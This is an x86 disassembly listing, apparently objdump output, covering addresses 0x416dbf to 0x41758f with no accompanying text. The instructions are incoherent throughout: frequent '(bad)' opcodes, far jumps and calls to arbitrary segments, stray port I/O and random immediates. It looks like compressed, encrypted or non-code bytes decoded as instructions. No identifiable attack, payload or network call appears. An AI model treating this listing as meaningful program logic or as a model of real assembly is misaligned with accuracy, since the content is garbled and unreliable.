  416dbf:	pand   mm3,QWORD PTR [esi]
  416dc2:	jecxz  0x416d7b
  416dc4:	arpl   WORD PTR [eax+0x207aa67e],si
  416dca:	fsubrp st(0),st
  416dcc:	dec    ebx
  416dcd:	shr    BYTE PTR [edx-0x1424aca6],1
  416dd3:	mov    edi,0x420c364b
  416dd8:	lds    edi,FWORD PTR [eax]
  416dda:	add    al,ah
  416ddc:	das    
  416ddd:	push   es
  416dde:	xchg   edi,eax
  416ddf:	push   es
  416de0:	mov    ds:0x66e3f59f,eax
  416de5:	cs (bad) 
  416de7:	jmp    0x23c9:0x257b145b
  416dee:	sub    dh,bl
  416df0:	(bad)  
  416df2:	push   ss
  416df3:	push   ebx
  416df4:	pop    esi
  416df5:	or     DWORD PTR [esi+0x60b0a73a],ebx
  416dfb:	add    ah,BYTE PTR [edi-0x14847a87]
  416e01:	adc    DWORD PTR [eax-0x13a5a814],edi
  416e07:	or     BYTE PTR [eax+0x64],0x56
  416e0b:	xor    DWORD PTR [edi-0x5c242328],eax
  416e11:	popa   
  416e12:	adc    bh,al
  416e14:	jmp    0x416e2b
  416e16:	jg     0x416dd1
  416e18:	jno    0x416dbc
  416e1a:	ins    DWORD PTR es:[edi],dx
  416e1b:	in     eax,0x19
  416e1d:	bound  esi,QWORD PTR [edi]
  416e1f:	arpl   WORD PTR [ebp+0x7dd26205],bp
  416e25:	pop    es
  416e26:	std    
  416e27:	ins    DWORD PTR es:[edi],dx
  416e28:	call   0xdb09:0x39a3e4b
  416e2f:	dec    ebp
  416e30:	aas    
  416e31:	out    dx,eax
  416e32:	cmp    al,al
  416e34:	arpl   WORD PTR cs:[edi],sp
  416e37:	mov    ah,BYTE PTR [ebx-0x6]
  416e3a:	jp     0x416e2e
  416e3c:	xor    al,BYTE PTR [edi]
  416e3e:	pop    esi
  416e3f:	inc    BYTE PTR [eax]
  416e41:	jmp    0x7d3462ae
  416e46:	mov    bl,0x42
  416e48:	cmp    ebp,DWORD PTR [ecx+0x4c]
  416e4b:	ins    DWORD PTR es:[edi],dx
  416e4c:	lock lahf 
  416e4e:	adc    BYTE PTR [edi-0x47],ah
  416e51:	pop    ds
  416e52:	sub    dl,BYTE PTR [eax-0x46]
  416e55:	push   0x5
  416e57:	jg     0x416e02
  416e59:	jmp    0x416dfd
  416e5b:	jnp    0x416e28
  416e5d:	repnz push es
  416e5f:	mov    ebp,ss
  416e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e62:	jnp    0x416e50
  416e64:	in     al,0xd0
  416e66:	aaa    
  416e67:	sub    DWORD PTR [esi],esp
  416e69:	ficomp DWORD PTR [ebp+0x32ac5106]
  416e6f:	(bad)  
  416e70:	and    eax,0xfcdb21e5
  416e75:	inc    esp
  416e76:	jne    0x416e00
  416e78:	lods   al,BYTE PTR ds:[esi]
  416e79:	cmp    DWORD PTR [ebx+0x117d5296],ecx
  416e7f:	jae    0x416e24
  416e81:	push   cs
  416e82:	jmp    0xd329ae74
  416e87:	mov    ah,0x6b
  416e89:	retf   0x787c
  416e8c:	fst    DWORD PTR [eax+0x726597f5]
  416e92:	xchg   BYTE PTR [eax-0x2e7dfab6],cl
  416e98:	jmp    0xa5c42a56
  416e9d:	js     0x416ec6
  416e9f:	sbb    ah,ch
  416ea1:	mov    esi,0x1c79a8ff
  416ea6:	jbe    0x416ec2
  416ea8:	cld    
  416ea9:	retf   0x1042
  416eac:	bound  esp,QWORD PTR [esp+edx*4-0x5dd40d11]
  416eb3:	pop    eax
  416eb4:	sbb    al,0xb2
  416eb6:	dec    ebp
  416eb7:	ficom  DWORD PTR [esi]
  416eb9:	cli    
  416eba:	xor    DWORD PTR [edi+ebp*1-0x27],ebp
  416ebe:	xchg   DWORD PTR ds:0xa984cfda,eax
  416ec4:	imul   cl
  416ec6:	inc    ebp
  416ec7:	push   ebx
  416ec8:	int    0xed
  416eca:	test   esp,esp
  416ecc:	je     0x416eb3
  416ece:	mov    ah,0x1e
  416ed0:	je     0x416f18
  416ed2:	jecxz  0x416e82
  416ed4:	push   0x5a
  416ed6:	jle    0x416eaa
  416ed8:	push   ds
  416ed9:	push   0xffffffc6
  416edb:	(bad)  
  416edd:	ja     0x416f54
  416edf:	aaa    
  416ee0:	mov    ds:0x69cf2145,al
  416ee5:	pop    ecx
  416ee6:	lahf   
  416ee7:	sar    BYTE PTR [ecx+edx*1],0xc6
  416eeb:	pop    ds
  416eec:	cli    
  416eed:	xchg   ecx,eax
  416eee:	push   es
  416eef:	push   ebp
  416ef1:	lahf   
  416ef2:	loope  0x416f1b
  416ef4:	adc    eax,0xe2cc613c
  416ef9:	mov    eax,0xcf72574e
  416efe:	pushf  
  416eff:	aam    0x5c
  416f01:	test   DWORD PTR [ecx-0x25e86a92],edx
  416f07:	jl     0x416e9c
  416f09:	push   esp
  416f0a:	mov    dh,0xe7
  416f0c:	(bad)  
  416f0d:	pop    ecx
  416f0e:	daa    
  416f0f:	cdq    
  416f10:	adc    DWORD PTR [ebp+0x7d],0x42
  416f14:	xchg   ecx,eax
  416f15:	in     al,dx
  416f16:	push   ebp
  416f17:	xchg   cl,bh
  416f19:	stos   BYTE PTR es:[edi],al
  416f1a:	arpl   cx,di
  416f1c:	push   ds
  416f1d:	test   DWORD PTR [esi-0xa673273],esp
  416f23:	cld    
  416f24:	add    esp,DWORD PTR [ebx-0x70]
  416f27:	inc    ecx
  416f28:	ret    0xf573
  416f2b:	xchg   ebp,eax
  416f2c:	jb     0x416f08
  416f2e:	xor    ah,cl
  416f30:	mov    al,0x3a
  416f32:	cli    
  416f33:	or     ch,dh
  416f35:	daa    
  416f36:	stc    
  416f37:	jl     0x416fb0
  416f39:	scas   eax,DWORD PTR es:[edi]
  416f3a:	dec    esi
  416f3b:	inc    edx
  416f3c:	fld    QWORD PTR [ebx]
  416f3e:	and    BYTE PTR [ebp+ecx*1+0x46682dcd],0xff
  416f46:	and    BYTE PTR [edi+0x4],bh
  416f49:	xor    eax,0x5bd6cbbb
  416f4e:	idiv   BYTE PTR [eax-0x58]
  416f51:	rcl    DWORD PTR [ebx-0x2c8509bd],1
  416f57:	cld    
  416f58:	push   cs
  416f59:	inc    ecx
  416f5a:	xchg   edx,eax
  416f5b:	push   edi
  416f5c:	mov    esp,0xa81e677d
  416f61:	fmul   QWORD PTR [ebp-0x379027ca]
  416f67:	daa    
  416f68:	test   al,0xe8
  416f6a:	les    edx,FWORD PTR [ebp-0x49]
  416f6d:	mov    edx,0xf8ab9fa2
  416f72:	fs fs and al,0x1a
  416f76:	jmp    0x416ff2
  416f78:	fdiv   QWORD PTR [edx]
  416f7a:	inc    esp
  416f7b:	mov    WORD PTR [edx+eax*8+0x58],fs
  416f7f:	cmp    BYTE PTR [edx+0x78],0x29
  416f83:	xor    al,0xdb
  416f85:	inc    edi
  416f86:	clc    
  416f87:	xor    edi,eax
  416f89:	push   edi
  416f8a:	popa   
  416f8b:	cmp    al,0x5
  416f8d:	mov    edx,ecx
  416f8f:	daa    
  416f90:	inc    edx
  416f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f92:	push   ss
  416f93:	jg     0x416f49
  416f95:	push   0xf18f5986
  416f9a:	mov    esp,DWORD PTR [edi]
  416f9c:	adc    BYTE PTR [edx-0x383c6d5e],bl
  416fa2:	pop    edx
  416fa3:	lock push cs
  416fa5:	scas   eax,DWORD PTR es:[edi]
  416fa6:	jp     0x416f69
  416fa8:	outs   dx,BYTE PTR ds:[esi]
  416fa9:	sbb    eax,0x786180af
  416fae:	ret    
  416faf:	(bad)  
  416fb0:	mov    ch,0x96
  416fb2:	push   eax
  416fb3:	rcl    BYTE PTR [esi+0x75],1
  416fb6:	jns    0x41701d
  416fb8:	and    al,0xc3
  416fba:	outs   dx,DWORD PTR ds:[esi]
  416fbb:	mov    ds:0x613180a9,al
  416fc0:	sub    eax,DWORD PTR [ebp+0x70150a2f]
  416fc6:	jmp    0xb528:0x8d26c853
  416fcd:	fnstcw WORD PTR [esp+edi*1-0x12ec572d]
  416fd4:	mov    dh,0x4e
  416fd6:	cmp    eax,0xd5645447
  416fdb:	cmp    BYTE PTR [esi+0xe0c7640],cl
  416fe1:	mov    ds:0x898bf4ff,eax
  416fe6:	mov    ecx,0xea91fe47
  416feb:	rcr    BYTE PTR [esi+0x1f96dd62],cl
  416ff1:	mov    ebx,0x4dcdaf36
  416ff6:	add    cl,BYTE PTR [esi+0x3f]
  416ff9:	nop
  416ffa:	jge    0x416fbf
  416ffc:	and    ecx,esi
  416ffe:	adc    BYTE PTR [ecx],ah
  417000:	jle    0x416fb2
  417002:	(bad)  
  417003:	sbb    al,0xc2
  417005:	cmp    BYTE PTR [edx+0x17],al
  417008:	cmp    BYTE PTR [eax-0x53],cl
  41700b:	jge    0x41703b
  41700d:	ss and al,BYTE PTR ds:[edx]
  417011:	fs and eax,0x6e06f5ba
  417017:	ins    DWORD PTR es:[edi],dx
  417018:	fidivr WORD PTR [ebp+0x3ae038b7]
  41701e:	cmc    
  41701f:	mov    edi,0x7cee3f84
  417024:	jo     0x417068
  417026:	xchg   esi,eax
  417027:	mov    al,ds:0x8f8517f7
  41702c:	ret    0x928b
  41702f:	add    esp,DWORD PTR [esi+eax*2+0x10]
  417033:	sub    al,0x7d
  417035:	mov    ebp,0xa806841
  41703a:	ja     0x416ff8
  41703c:	push   esp
  41703d:	aaa    
  41703e:	pop    si
  417040:	es js  0x416fd9
  417043:	pop    edx
  417044:	ret    0xb4c4
  417047:	or     BYTE PTR [ebx+0x3b108812],dl
  41704d:	jle    0x41705c
  41704f:	test   DWORD PTR [edx+eiz*8-0x53],0x34349b0d
  417057:	mov    cl,0xe7
  417059:	std    
  41705a:	add    dl,BYTE PTR [edx+0x5694380f]
  417060:	mov    ds:0xaeb5c526,eax
  417065:	mov    al,ds:0xf5eb9bbc
  41706a:	stos   BYTE PTR es:[edi],al
  41706b:	inc    ebx
  41706c:	mov    ds:0x1351bf1,eax
  417071:	xchg   ebx,eax
  417072:	inc    esi
  417073:	inc    esp
  417074:	sbb    DWORD PTR [ebx],0x1d
  417077:	xchg   edi,eax
  417078:	sub    BYTE PTR [edx-0x7fae50a3],al
  41707e:	scas   eax,DWORD PTR es:[edi]
  41707f:	(bad)  
  417080:	adc    ebx,DWORD PTR [eax-0x370c3ef8]
  417086:	(bad)  
  417087:	mov    ch,0x8a
  417089:	inc    edi
  41708a:	or     DWORD PTR [edi],ecx
  41708c:	ins    BYTE PTR es:[edi],dx
  41708d:	sub    edx,DWORD PTR [edx+ebp*8-0x6f277e3c]
  417094:	inc    edx
  417095:	jo     0x417102
  417097:	daa    
  417098:	stos   DWORD PTR es:[edi],eax
  417099:	dec    edi
  41709a:	out    0xa5,eax
  41709c:	sbb    eax,0xcdf923b6
  4170a1:	cmc    
  4170a2:	dec    edi
  4170a3:	retf   0x10b9
  4170a6:	adc    esi,DWORD PTR [ebx+0x7e79413a]
  4170ac:	xchg   ebx,eax
  4170ad:	cmc    
  4170ae:	ret    
  4170af:	mov    ebp,esp
  4170b1:	and    al,0x75
  4170b3:	add    ch,0xb7
  4170b6:	aad    0x33
  4170b8:	scas   eax,DWORD PTR es:[edi]
  4170b9:	inc    esi
  4170ba:	dec    ebx
  4170bb:	add    al,BYTE PTR [eax-0x61]
  4170be:	inc    esp
  4170bf:	cwde   
  4170c0:	or     DWORD PTR [ebp+0x1aebc773],esp
  4170c6:	xor    ecx,DWORD PTR [ebp+0x6d]
  4170c9:	jmp    0xd950:0x68e83d75
  4170d0:	mov    ecx,0x416be2e5
  4170d5:	cdq    
  4170d6:	and    bl,BYTE PTR [edi]
  4170d8:	mov    WORD PTR [ecx-0x1e85a74b],cs
  4170de:	add    dh,dl
  4170e0:	mul    ah
  4170e2:	mov    ds:0x9913fc0,al
  4170e7:	das    
  4170e8:	inc    edx
  4170e9:	pop    esi
  4170ea:	out    0xe8,al
  4170ec:	test   BYTE PTR [edx-0x1b],al
  4170ef:	ficomp DWORD PTR [ebx+0x4469352]
  4170f5:	mov    bh,0x8d
  4170f7:	(bad)  
  4170f8:	cmp    eax,0x96525753
  4170fd:	lahf   
  4170fe:	xor    ah,bh
  417100:	rcr    DWORD PTR [eax],cl
  417102:	xor    ebp,esp
  417104:	mov    cl,0x54
  417106:	int3   
  417107:	dec    edi
  417108:	lods   al,BYTE PTR ds:[esi]
  417109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41710a:	fisubr DWORD PTR [eax+ebx*4]
  41710d:	inc    ebp
  41710e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41710f:	gs pop ecx
  417111:	mov    eax,0xb86f20cf
  417116:	jne    0x41714f
  417118:	push   edi
  417119:	jmp    0xe0328dd2
  41711e:	call   0x7cbe:0xbaf05f43
  417125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417126:	daa    
  417127:	push   ebx
  417128:	jecxz  0x4171a2
  41712a:	mov    al,ds:0xd410b2bf
  41712f:	stos   DWORD PTR es:[edi],eax
  417130:	ret    0x8280
  417133:	in     eax,0x6d
  417135:	out    dx,eax
  417136:	rcr    BYTE PTR [ebx+0x36],1
  417139:	outs   dx,DWORD PTR ds:[esi]
  41713a:	sbb    ebx,esi
  41713c:	jge    0x417190
  41713e:	adc    DWORD PTR [edi+0x2ea58d6f],0x420492fc
  417148:	and    cl,BYTE PTR [edi]
  41714a:	xchg   BYTE PTR [esi-0x290abaad],dl
  417150:	leave  
  417151:	jae    0x20c751a0
  417157:	mov    al,0x14
  417159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41715a:	jns    0x4171b4
  41715c:	(bad)  
  41715d:	mov    ebx,0x5b87a9a7
  417162:	lock retf 
  417164:	and    eax,DWORD PTR [eax+0x539c02f]
  41716a:	fistp  DWORD PTR [eax-0x47]
  41716d:	rcl    DWORD PTR [eax],1
  41716f:	ins    DWORD PTR es:[edi],dx
  417170:	sub    al,0xde
  417172:	clc    
  417173:	and    eax,0x7eaa0cd2
  417178:	fistp  QWORD PTR [ebx]
  41717a:	add    eax,0x27826ceb
  41717f:	or     eax,0x12eb19f
  417184:	sub    DWORD PTR [edx+0x53dc5699],edx
  41718a:	test   al,0x65
  41718c:	pushf  
  41718d:	add    cl,BYTE PTR [esi-0x1934380d]
  417193:	jl     0x417138
  417195:	mov    al,0x9a
  417197:	mov    ds:0xc15829d5,al
  41719c:	cmp    DWORD PTR [eax+0x7d456bbb],edi
  4171a2:	push   ebx
  4171a3:	outs   dx,DWORD PTR ds:[esi]
  4171a4:	jns    0x417150
  4171a6:	jg     0x417208
  4171a8:	shl    esi,0x30
  4171ab:	fisttp DWORD PTR [ebx-0x48bf3145]
  4171b1:	mov    ecx,0x37fb0174
  4171b6:	fisubr DWORD PTR [eax+0x2bd41590]
  4171bc:	pop    esp
  4171bd:	das    
  4171be:	xchg   esp,eax
  4171bf:	js     0x417226
  4171c1:	and    eax,0xe015ae9b
  4171c6:	lock ins BYTE PTR es:[edi],dx
  4171c8:	pop    ds
  4171c9:	dec    edx
  4171ca:	cld    
  4171cb:	pop    esp
  4171cc:	aad    0x24
  4171ce:	fwait
  4171cf:	jo     0x41715b
  4171d1:	mov    ch,0xc4
  4171d3:	xchg   ebx,eax
  4171d4:	xor    eax,0xc4ca15cd
  4171d9:	pop    es
  4171da:	and    eax,0xbeae9d36
  4171df:	retf   
  4171e0:	mov    bl,0x9
  4171e2:	pop    ebp
  4171e3:	pop    es
  4171e4:	jmp    0xb851:0xe94eadd0
  4171eb:	mov    ds:0x975d0242,eax
  4171f0:	enter  0x9e18,0x92
  4171f4:	push   ss
  4171f5:	cmc    
  4171f6:	mov    WORD PTR [edi+0x76e618a2],?
  4171fc:	jmp    0xab622405
  417201:	sub    edx,esi
  417203:	into   
  417204:	sub    al,BYTE PTR [esi+0x14]
  417207:	hlt    
  417208:	adc    al,0x62
  41720a:	adc    BYTE PTR [esi-0x40],cl
  41720d:	jmp    0x5821:0x1b7939ec
  417214:	int    0x1f
  417216:	push   esp
  417217:	or     al,0x79
  417219:	(bad)  
  41721a:	out    0x3,al
  41721c:	sub    edi,DWORD PTR ds:0x2d2115ed
  417222:	push   esi
  417223:	shr    DWORD PTR [edi-0x73],cl
  417226:	stos   DWORD PTR es:[edi],eax
  417227:	int3   
  417228:	hlt    
  417229:	int3   
  41722a:	adc    dh,dh
  41722c:	inc    ecx
  41722d:	dec    edx
  41722e:	je     0x4172a4
  417230:	fcomp  st(4)
  417232:	jecxz  0x4171bb
  417234:	adc    ch,BYTE PTR [edx-0xe879e07]
  41723a:	loopne 0x417268
  41723c:	sbb    eax,0xb4cd116e
  417241:	loope  0x4171f9
  417243:	outs   dx,BYTE PTR ds:[esi]
  417244:	pand   mm4,QWORD PTR [esi]
  417247:	sbb    DWORD PTR [ebx-0x59cbac92],0x7f
  41724e:	mov    esi,0x827053f5
  417253:	mov    eax,ds:0xff0cca69
  417258:	scas   al,BYTE PTR es:[edi]
  417259:	sub    eax,0xca71b456
  41725e:	(bad)  
  41725f:	aaa    
  417260:	add    eax,0xa4580ad8
  417265:	xchg   ecx,eax
  417266:	dec    ebp
  417267:	ret    
  417268:	pop    edx
  417269:	loopne 0x417282
  41726b:	pop    ebx
  41726c:	(bad)  
  41726d:	clc    
  41726e:	loopne 0x417290
  417270:	jp     0x4172df
  417272:	jl     0x4171f8
  417274:	jbe    0x4172f5
  417276:	or     esp,DWORD PTR [edx+eax*1]
  417279:	imul   ebx,DWORD PTR [esi],0xc03a83e
  41727f:	pusha  
  417280:	out    dx,eax
  417281:	jno    0x417282
  417283:	in     al,dx
  417284:	std    
  417285:	xor    eax,0xf1d46a8e
  41728a:	int3   
  41728b:	pop    esp
  41728c:	loope  0x417238
  41728e:	mov    BYTE PTR [ecx-0x39],dl
  417291:	jle    0x4172d8
  417293:	push   0x7bda2fd2
  417298:	jne    0x41724c
  41729a:	cmp    eax,0x5239ebfc
  41729f:	xchg   ecx,eax
  4172a0:	ds jbe 0x41725c
  4172a3:	xchg   esi,eax
  4172a4:	mov    ebp,0xd8f702eb
  4172a9:	(bad)  
  4172aa:	pushf  
  4172ab:	add    eax,DWORD PTR [eax-0x338964bd]
  4172b1:	aas    
  4172b2:	sbb    ebx,DWORD PTR [ecx]
  4172b4:	out    dx,eax
  4172b5:	imul   edx,esp,0x6d3e6d10
  4172bb:	cmp    eax,0x1479d7c2
  4172c0:	push   ds
  4172c1:	in     al,dx
  4172c2:	sbb    BYTE PTR [ecx],cl
  4172c4:	rcr    BYTE PTR [edi],0x1f
  4172c7:	stos   DWORD PTR es:[edi],eax
  4172c8:	mov    ds:0x90efc1c6,eax
  4172cd:	retf   0xe0ef
  4172d0:	or     bl,al
  4172d2:	pop    eax
  4172d3:	sub    al,0xbd
  4172d5:	ud1    ebx,esi
  4172d8:	(bad)  
  4172d9:	sahf   
  4172da:	enter  0x531a,0x7f
  4172de:	xor    al,0x1c
  4172e0:	push   eax
  4172e1:	scas   al,BYTE PTR es:[edi]
  4172e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172e3:	pop    ebx
  4172e4:	push   0x6d0c5fc7
  4172e9:	and    ah,0x3
  4172ec:	add    bh,BYTE PTR ds:[ecx-0x480bfee9]
  4172f3:	xor    ecx,esi
  4172f5:	mov    edi,fs
  4172f7:	ror    bl,cl
  4172f9:	ret    
  4172fa:	in     al,0x17
  4172fc:	sub    BYTE PTR [ecx-0x79],ch
  4172ff:	daa    
  417300:	push   esi
  417301:	and    esp,ebx
  417303:	dec    ebp
  417304:	lock add eax,0x95c02646
  41730a:	push   cs
  41730b:	es jle 0x4172df
  41730e:	retf   
  41730f:	and    ecx,edi
  417311:	xchg   ecx,eax
  417312:	je     0x417324
  417314:	out    0xfc,al
  417316:	and    DWORD PTR [eax+0x7687e5b2],ebp
  41731c:	pop    edx
  41731d:	aaa    
  41731e:	jo     0x41737a
  417320:	pop    esi
  417321:	jmp    0x8029:0x2fd119e1
  417328:	and    dl,cl
  41732a:	retf   0x46b3
  41732d:	into   
  41732e:	push   edx
  41732f:	sti    
  417330:	xor    DWORD PTR [ebx+0x3bb3308c],ecx
  417336:	add    al,0xc4
  417338:	xchg   ecx,eax
  417339:	ret    
  41733a:	sub    DWORD PTR [edi],ecx
  41733c:	xchg   esi,eax
  41733d:	and    BYTE PTR [edi+0x79],ch
  417340:	dec    esi
  417341:	xor    BYTE PTR ds:[ebp+0x2a],bh
  417345:	push   edx
  417346:	dec    esp
  417347:	inc    eax
  417348:	lock dec edi
  41734a:	mov    cl,0x83
  41734c:	pop    edi
  41734e:	push   ebp
  41734f:	test   BYTE PTR [esi],dh
  417351:	loopne 0x4173c3
  417353:	cmp    DWORD PTR [edx+0x5f],ecx
  417356:	mov    ebx,0x1934da52
  41735b:	enter  0xe918,0x86
  41735f:	fiadd  WORD PTR [eax-0x70]
  417362:	in     al,dx
  417363:	shr    DWORD PTR [edx+esi*2-0xa538a53],0x31
  41736b:	in     al,dx
  41736c:	fdivr  DWORD PTR gs:[eax+eax*8]
  417370:	(bad)  
  417371:	js     0x4173d7
  417373:	ds daa 
  417375:	int    0xfe
  417377:	adc    ebx,DWORD PTR [eax]
  417379:	or     eax,0xf38fabfa
  41737e:	mov    WORD PTR [eax-0x49],?
  417381:	cmp    al,0x7d
  417383:	cmp    bh,BYTE PTR [ebp-0x2c1fe1a3]
  417389:	inc    edi
  41738a:	cmp    al,0x74
  41738c:	xlat   BYTE PTR ds:[ebx]
  41738d:	and    DWORD PTR [edi+0x4922ace1],ebx
  417393:	push   es
  417394:	inc    esp
  417395:	rcl    DWORD PTR [ebp+0x76],cl
  417398:	aas    
  417399:	push   ebp
  41739a:	int3   
  41739b:	jb     0x41739d
  41739d:	and    bl,BYTE PTR [ebp-0x2b]
  4173a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173a1:	mov    esi,DWORD PTR [ecx-0x64]
  4173a4:	mov    edi,0x4c77c806
  4173a9:	add    al,0xe5
  4173ab:	je     0x417404
  4173ad:	jle    0x41740f
  4173af:	jnp    0x417336
  4173b1:	imul   ebx,DWORD PTR [eax+edx*8],0xffffffe8
  4173b5:	inc    edi
  4173b6:	in     eax,0x11
  4173b8:	rcl    DWORD PTR [esi],0xc
  4173bb:	sub    edx,ebp
  4173bd:	or     al,0x6c
  4173bf:	shr    BYTE PTR [ecx+0x4c4d058f],1
  4173c5:	jb     0x4173ce
  4173c7:	inc    eax
  4173c8:	adc    dl,BYTE PTR [eax]
  4173ca:	or     ecx,esi
  4173cc:	imul   esi,ebx,0xffffffbf
  4173cf:	rcl    BYTE PTR [edx+eiz*4],1
  4173d2:	pop    eax
  4173d3:	inc    ebx
  4173d4:	sbb    al,0x27
  4173d6:	xchg   edi,eax
  4173d7:	mov    bl,BYTE PTR [eax+ebx*4+0x34]
  4173db:	leave  
  4173dc:	ins    BYTE PTR es:[edi],dx
  4173dd:	scas   al,BYTE PTR es:[edi]
  4173de:	ins    DWORD PTR es:[edi],dx
  4173df:	add    edx,DWORD PTR ds:0xaffe5ba6
  4173e5:	xchg   esi,eax
  4173e6:	jae    0x417384
  4173e8:	(bad)  
  4173e9:	xchg   esp,eax
  4173ea:	fstp   QWORD PTR [eax+edx*4-0x79]
  4173ee:	xchg   edx,eax
  4173ef:	(bad)  
  4173f0:	xchg   edi,eax
  4173f1:	idiv   dl
  4173f3:	icebp  
  4173f4:	push   esi
  4173f5:	mov    ds:0xa5313a25,al
  4173fa:	adc    eax,0x29d445
  4173ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417400:	push   ss
  417401:	mov    esp,0x6588387c
  417406:	lods   eax,DWORD PTR ds:[esi]
  417407:	mov    dl,0x9e
  417409:	jns    0x417394
  41740b:	push   esp
  41740c:	jb     0x417423
  41740e:	mov    ds:0x540fd3fb,al
  417413:	jo     0x4173fd
  417415:	mov    DWORD PTR [edi],esp
  417417:	sub    DWORD PTR [edx+ebp*1],eax
  41741a:	jmp    0x417436
  41741c:	sub    al,0x99
  41741e:	cmp    DWORD PTR [eax],edx
  417420:	gs retf 0xea68
  417424:	pusha  
  417425:	js     0x4173e0
  417427:	xchg   esp,eax
  417428:	(bad)  
  417429:	mov    al,0xe6
  41742b:	or     esp,ebx
  41742d:	inc    ecx
  41742e:	or     ebx,eax
  417430:	xor    DWORD PTR [eax-0x9a5009],ebp
  417436:	mov    dh,0x38
  417438:	jg     0x4173eb
  41743a:	xchg   DWORD PTR [ebp-0x4f47f8cc],eax
  417440:	aaa    
  417441:	push   eax
  417442:	sub    eax,0x84edad6c
  417447:	inc    eax
  417448:	push   esi
  417449:	aaa    
  41744a:	push   eax
  41744b:	mov    gs,eax
  41744d:	pushf  
  41744e:	sub    dl,dh
  417450:	popa   
  417451:	mov    ebp,0x9a4c6196
  417456:	leave  
  417457:	mov    esp,ebp
  417459:	jmp    0x5833e673
  41745e:	cdq    
  41745f:	or     ebx,DWORD PTR [eax+0x62]
  417462:	mov    BYTE PTR [edx+edi*1],al
  417465:	jle    0x4174a1
  417467:	jle    0x4174d9
  417469:	int    0x62
  41746b:	cmp    BYTE PTR [ebx],cl
  41746d:	xchg   ebx,eax
  41746e:	pop    eax
  41746f:	xor    al,0x6e
  417471:	mov    DWORD PTR [ebp+0x36e8dd45],0x67f2c893
  41747b:	dec    edi
  41747c:	lahf   
  41747d:	push   esi
  41747e:	pop    ebp
  41747f:	xchg   edi,eax
  417480:	dec    DWORD PTR [ebp+0x52248c5f]
  417486:	pop    ds
  417487:	cli    
  417488:	aas    
  417489:	cmp    DWORD PTR [esi-0x6],ebx
  41748c:	jle    0x417441
  41748e:	outs   dx,DWORD PTR ds:[esi]
  41748f:	jae    0x4174c5
  417491:	or     esi,edi
  417493:	fs dec esp
  417495:	sar    esp,0x6b
  417498:	push   esp
  417499:	jl     0x417506
  41749b:	xchg   esp,eax
  41749c:	outs   dx,DWORD PTR ds:[esi]
  41749d:	or     eax,eax
  41749f:	cmp    al,0x14
  4174a1:	in     eax,dx
  4174a2:	xchg   edx,eax
  4174a3:	mov    ds:0x24f847ee,al
  4174a8:	sar    BYTE PTR [edx+0x272dafa0],1
  4174ae:	in     eax,dx
  4174af:	fucom  st(6)
  4174b1:	ins    DWORD PTR es:[edi],dx
  4174b2:	and    eax,0x7991c163
  4174b7:	and    eax,0x6c4eee94
  4174bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174bd:	sbb    eax,0x8ecadbc0
  4174c2:	inc    ebp
  4174c3:	push   es
  4174c4:	and    eax,0xb53086ba
  4174c9:	ds in  eax,0x45
  4174cc:	sbb    ecx,DWORD PTR [edi+0x16]
  4174cf:	xchg   edi,eax
  4174d0:	loopne 0x41745f
  4174d2:	add    BYTE PTR [eax-0x58b1a559],0xcf
  4174d9:	sub    al,0x47
  4174db:	and    cl,bl
  4174dd:	je     0x417525
  4174df:	sbb    DWORD PTR [ebx+0x779f96],eax
  4174e5:	mov    ah,0x91
  4174e7:	pop    esp
  4174e8:	jg     0x4174dc
  4174ea:	outs   dx,DWORD PTR ds:[esi]
  4174eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174ec:	sub    ch,BYTE PTR [edx+0x84ac4ff]
  4174f2:	leave  
  4174f3:	sub    eax,0xca203bdf
  4174f8:	inc    ecx
  4174f9:	shr    DWORD PTR [ecx-0x57],0x82
  4174fd:	aad    0x60
  4174ff:	scas   eax,DWORD PTR es:[edi]
  417500:	adc    dl,BYTE PTR [edx]
  417502:	add    DWORD PTR [edi],ecx
  417504:	addr16 cmp al,0x32
  417507:	push   ecx
  417508:	aas    
  417509:	jbe    0x4174ad
  41750b:	out    dx,al
  41750c:	js     0x417494
  41750e:	mov    al,ds:0xb1cb600
  417513:	into   
  417514:	(bad)  
  417515:	cld    
  417516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417517:	cdq    
  417518:	ficom  WORD PTR [eax+0x27]
  41751b:	or     DWORD PTR [ecx+0x2b],edx
  41751e:	test   eax,0x1bc3feeb
  417523:	sbb    cl,BYTE PTR [eax+edx*1-0x18840bef]
  41752a:	js     0x4175a8
  41752c:	adc    edx,esp
  41752e:	(bad)  
  41752f:	push   esi
  417530:	jno    0x417508
  417532:	ficomp WORD PTR [ecx-0x72493878]
  417538:	in     eax,0x2
  41753a:	(bad)  
  41753b:	jno    0x417521
  41753d:	daa    
  41753e:	test   DWORD PTR [ebx+0x35de4d3],0x24d3a66a
  417548:	pop    ecx
  417549:	sub    eax,0xbe60ecc8
  41754e:	dec    edi
  41754f:	es inc ebp
  417551:	mov    dh,0x52
  417553:	(bad)  
  417554:	cmp    ch,BYTE PTR [edi+0x57]
  417557:	sbb    bh,BYTE PTR [ebx-0x9738e80]
  41755d:	imul   esi,DWORD PTR [edi],0x7a9965b6
  417563:	adc    eax,DWORD PTR [eax+ebx*4]
  417566:	adc    BYTE PTR [ebx-0x182d96b9],0x7a
  41756d:	dec    eax
  41756e:	add    al,0xaf
  417570:	cmp    al,0x23
  417572:	(bad)  
  417573:	arpl   sp,bx
  417575:	addr16 rcl eax,0x12
  417579:	jge    0x417586
  41757b:	xlat   BYTE PTR ds:[ebx]
  41757c:	push   ebx
  41757d:	je     0x417542
  41757f:	outs   dx,BYTE PTR ds:[esi]
  417580:	aad    0x9a
  417582:	pop    ebx
  417583:	imul   edi,DWORD PTR [ebx+0x49],0xffffffbc
  417587:	dec    ebx
  417588:	fist   WORD PTR [esi-0x7d]
  41758b:	ja     0x417561
  41758d:	push   ecx
  41758e:	xchg   ecx,eax
  41758f:	lock xor ah,BYTE PTR [edx-0x4f474486]
